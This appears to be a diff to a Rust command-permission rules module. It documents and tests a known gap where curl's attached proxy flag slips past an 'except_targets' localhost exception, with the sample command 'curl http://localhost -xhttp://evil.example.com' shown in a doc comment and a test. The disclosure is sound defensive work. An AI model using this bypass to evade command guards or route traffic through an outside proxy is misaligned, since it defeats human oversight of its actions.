@@ -539,13 +539,33 @@ fn resolved_strings(argv: &[NormalizedWord]) -> Vec<&str> {
 /// suppressed — the dangerous target was never examined at all). A bare
 /// flag (`-s`, `--verbose`, a short cluster) yields no candidate.
 ///
-/// # Known limitation
+/// # Known limitation — NOT merely cosmetic
 ///
-/// A short flag with an attached value and no separator (`-ohttp://evil`)
-/// is not specially handled — same class of gap as
-/// [`skip_wrapper_arguments`]'s documented limitation on non-`-`-prefixed
-/// wrapper values. Not reachable by the `targets`-non-empty branch, which
-/// draws its candidates from `targets` matches instead of this function.
+/// A single-dash token with an attached value and no `=` separator
+/// (curl's `-xhttp://evil.example.com`, its short-flag proxy syntax)
+/// yields no candidate at all: this function has no way to tell that
+/// shape apart from an ordinary combined short-flag cluster (`-sSL`)
+/// using only the token's own text — this module has no per-command
+/// flag-arity table by design (shape-based matching only, no regex, no
+/// command-specific semantics, module docs). Unlike
+/// [`skip_wrapper_arguments`]'s documented gap (which can only ever
+/// *under-resolve* which inner rule would have blocked, never turn a
+/// floor into a silent Allow), this gap really can let except_targets
+/// suppress a rule it shouldn't: `curl http://localhost
+/// -xhttp://evil.example.com` (or `-sxhttp://evil.example.com`) is wrongly
+/// suppressed on a rule whose except_targets are all localhost prefixes —
+/// the excepted `http://localhost` positional is the only *recognised*
+/// candidate, so "all candidates excepted" holds vacuously while the
+/// unexamined proxy target does the actual damage. Deliberately not
+/// "fixed" by treating every multi-character single-dash token as a
+/// candidate: that would make ordinary flag clusters like `-fsSL` fail
+/// to except (since they'd never match an `except_targets` path/URL
+/// shape either), defeating the feature for exactly the common case it
+/// exists to serve. Not reachable by the `targets`-non-empty branch,
+/// which draws its candidates from `targets` matches instead of this
+/// function. Anyone gating a command with this attached-value flag idiom
+/// should additionally forbid the flag via `required_flags`/a separate
+/// `deny` entry rather than relying on `except_targets` alone.
 fn target_candidate(token: &str) -> Option<&str> {
     if !token.starts_with('-') {
         return Some(token);
@@ -2573,6 +2593,42 @@ mod tests {
             rules
                 .match_command(&argv(&["curl", "--verbose", "http://localhost"]))
                 .is_none()
+        );
+    }
+
+    #[test]
+    fn except_targets_known_gap_single_dash_attached_value_is_not_a_candidate() {
+        // Documents a known, disclosed limitation (see `target_candidate`'s
+        // doc comment and the README's except_targets caveat), pinned here
+        // so it can't regress silently *worse* and so a future reader sees
+        // it's a deliberate, understood trade-off rather than an oversight:
+        // a single-dash token with an attached value and no `=` (curl's
+        // `-xhttp://...` short proxy-flag syntax) is indistinguishable from
+        // an ordinary combined short-flag cluster using shape alone, so it
+        // yields no except_targets candidate at all. The excepted
+        // `http://localhost` positional is the only *recognised* candidate,
+        // so this rule is (wrongly) suppressed even though the unexamined
+        // `-x` proxy target is exactly what it should have caught.
+        let rules = Rules::parse(
+            r#"
+            [[command]]
+            id = "curl-non-localhost"
+            reason = "ask unless curl targets localhost"
+            decision = "ask"
+            command = "curl"
+            except_targets = [{ prefix = "http://localhost" }]
+        "#,
+        )
+        .unwrap();
+        assert!(
+            rules
+                .match_command(&argv(&[
+                    "curl",
+                    "http://localhost",
+                    "-xhttp://evil.example.com"
+                ]))
+                .is_none(),
+            "known gap: a single-dash attached-value target is not recognised as a candidate"
         );
     }
 
